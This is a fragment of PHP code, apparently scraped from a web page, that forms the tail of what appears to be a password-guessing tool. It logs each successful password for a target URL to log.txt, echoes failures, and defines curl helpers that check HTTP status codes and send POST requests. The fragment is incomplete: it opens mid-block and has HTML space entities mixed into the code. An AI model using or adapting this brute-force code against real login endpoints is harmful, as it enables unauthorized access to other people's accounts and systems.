{
file_put_contents("log.txt",$PostUrl.' '.'Password:'.$now.' # Succed!'."\r\n",FILE_APPEND);
exit();
}else{
echo 'Password:'.$now."failed\r\n";
}

}

fclose($file);

&nbsp;

&nbsp;
function GetHttpStatusCode($url){
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL,$url);//url
curl_setopt($curl,CURLOPT_HEADER,1);//http
curl_setopt($curl,CURLOPT_NOBODY,1);//htmlbody
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);//
curl_setopt($curl,CURLOPT_TIMEOUT,3); //
curl_exec($curl);
$rtn= curl_getinfo($curl,CURLINFO_HTTP_CODE);
curl_close($curl);
return $rtn;
}
function POST_Data($PostUrl, $DATA)
{
$ch = curl_init();//curl
curl_setopt($ch,CURLOPT_URL, $PostUrl);//
curl_setopt($ch, CURLOPT_HEADER, 0);//header
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//
curl_setopt($ch, CURLOPT_POST, 1);//post
curl_setopt($ch, CURLOPT_POSTFIELDS, $DATA);
$data = curl_exec($ch);//curl
curl_close($ch);
return $data;//
}
